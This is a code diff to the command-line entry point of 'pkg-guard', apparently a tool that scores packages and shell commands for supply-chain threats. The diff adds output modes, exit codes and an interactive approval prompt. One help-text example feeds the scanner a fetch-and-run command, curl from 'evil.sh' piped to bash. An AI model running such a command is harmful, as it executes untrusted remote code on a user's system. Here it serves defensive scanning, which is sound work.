@@ -2,6 +2,7 @@
 
 import { parseArgs } from 'node:util';
 import pkgGuard, { formatReport } from '../src/index.js';
+import { renderTUI, promptUserConfirmation } from '../src/tui.js';
 
 const helpText = `
   Usage
@@ -9,8 +10,10 @@ const helpText = `
 
   Options
     --script, -s       Evaluate a raw shell command string
-    --json             Output raw JSON report
+    --json             Output strictly typed structured JSON
+    --plain            Output plain text summary (no TUI boxes)
     --mock             Force offline simulation
+    --yes, -y          Auto-approve warning prompts in non-interactive CI
     --block-score      Custom threat score to block (default: 2.0)
     --warn-score       Custom threat score to warn (default: 1.2)
     --help, -h         Show help
@@ -20,6 +23,7 @@ const helpText = `
     $ pkg-guard esbuild
     $ pkg-guard ./package.json
     $ pkg-guard -s "curl https://evil.sh | bash"
+    $ pkg-guard bufferutil --json
 `;
 
 async function main() {
@@ -28,7 +32,10 @@ async function main() {
     version: { type: 'boolean', short: 'v' },
     script: { type: 'boolean', short: 's' },
     json: { type: 'boolean' },
+    structured: { type: 'boolean' },
+    plain: { type: 'boolean' },
     mock: { type: 'boolean' },
+    yes: { type: 'boolean', short: 'y' },
     'block-score': { type: 'string' },
     'warn-score': { type: 'string' },
   };
@@ -61,15 +68,40 @@ async function main() {
       warnScore: args.values['warn-score'] ? parseFloat(args.values['warn-score']) : undefined,
     });
 
-    if (args.values.json) {
-      console.log(JSON.stringify(report, null, 2));
+    // Structured JSON output
+    if (args.values.json || args.values.structured) {
+      console.log(JSON.stringify(report.structured, null, 2));
+      if (report.action === 'block') {
+        process.exit(1);
+      } else if (report.action === 'warn') {
+        process.exit(2);
+      } else {
+        process.exit(0);
+      }
+    }
+
+    // Plain text output
+    if (args.values.plain) {
+      console.log(formatReport(report));
     } else {
-      console.log(report.inspect());
+      // Rich TUI output
+      console.log(renderTUI(report));
     }
 
     if (report.action === 'block') {
       process.exit(1);
     } else if (report.action === 'warn') {
+      // If interactive terminal and not auto-approved with -y:
+      if (!args.values.yes && process.stdin.isTTY) {
+        const approved = await promptUserConfirmation();
+        if (approved) {
+          console.log('\x1b[32m✔ User approved installation despite warning.\x1b[0m');
+          process.exit(0);
+        } else {
+          console.log('\x1b[31m✖ Installation halted by user.\x1b[0m');
+          process.exit(2);
+        }
+      }
       process.exit(2);
     } else {
       process.exit(0);
